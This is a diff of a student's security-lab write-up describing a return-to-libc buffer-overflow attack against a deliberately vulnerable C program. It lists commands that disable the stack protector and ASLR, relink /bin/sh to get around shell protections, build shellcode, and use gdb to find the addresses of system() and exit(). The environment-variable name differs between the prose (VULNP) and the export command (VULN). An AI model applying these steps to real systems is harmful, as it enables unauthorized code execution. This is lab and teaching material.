@@ -76,7 +76,7 @@ _start:
 
 ### 1. Preparation
 
-I saved the vulnerable C program the file file task1.c and shellcode into task1.asm.
+I saved the vulnerable C program in a file named env.c and shellcode in task1.asm.
 In order to attack, I will first convert the task1.asm into machine code using the following commands. 
 
 ```
@@ -84,41 +84,69 @@ nasm -g -f elf task1.asm
 ld -m elf_i386 -o task1 task1.o
 ```
 
-My idea is I will use system() to execute task1, which generated above. In order to to that, I need to overflow the buffer memory to higher address, which will redirect my program flow to execute task1 as expected.
+My idea is I will use system() to execute shellcode in task1, which generated above. In order to to that, I need to overflow the buffer memory to higher addresses, which will redirect my program flow to execute shellcode in task1 as expected.
 
-Consider the stack frame of the main function of task1.c.
+Consider the stack frame of the main function of env.c.
 
 <img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/df4e5886a438efa58ca5f62a86a4dca38be1529f/images/task1/mainstackframe.png"><br>
 
-I will replace the return address with the address of system(), set argc to the address of exit(), and set argv to the address of task1. This way, when the program returns, it will run system() as the return address is popped off the stack.
+I will replace data in return address with the address of system(), set argc to the address of exit(). Since task1 is placed on disk so in order to run it I will saved its path in an environment variable named VULNP, then place address of that variable in argv. This way, when the program returns, it will run system() as the return address is popped off the stack.
 
-### 2. Conduct the attack
+Command to create environment variable:
 
-Now I need to find three thing: address of system(), address of exit(), address of task1. Here's the steps:
+```
+export VULN=/home/seed/seclabs/bof/task1
+```
 
-#### 1. Compile task1.c and turn off OS's address space layout randomization
+### 2. Build the attack
 
-Compiling task1.c and turning off OS's address space layout randomization using these commands:
+Now I need to find three things: address of system(), address of exit(), address of VULNP. Here're the steps:
+
+#### 1. Compile env.c and turn off countermeasure factors in OS 
+
+Compiling env.c with some options such as disabling the stack protector and allowing execution on stack:
+
+```
+gcc -g env.c -o env.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
+```
+
+Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04:
+
+```
+sudo ln -sf /bin/zsh /bin/sh
+```
+
+Turn off OS's address space layout randomization 
 
 ```
 sudo sysctl -w kernel.randomize_va_space=0
-gcc -g task1.c -o task1.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
 ```
 
 #### 2. Run gdb and find necessary addresses
 
-Running following commands:
+Run the env.out
 
 ```
-gdb -q task1.out
+gdb -q env.out
 start
+```
+
+Then, run these two following commands to find addresses of system() and exit():
+
+```
 p system
 p exit
 ```
 
+Also run this command to get address of VULNP variable:
+
+```
+print getenv("VULNP")
+```
+
 Here's the result:
 
-<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/df4e5886a438efa58ca5f62a86a4dca38be1529f/images/task1/address.jpg"><br>
+<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/7d75e56e9344244e6cea9989841ee95f6f4dbb36/images/task1/getAddress.jpg"><br>
 
 Address of system(): 0xf7e50db0
 
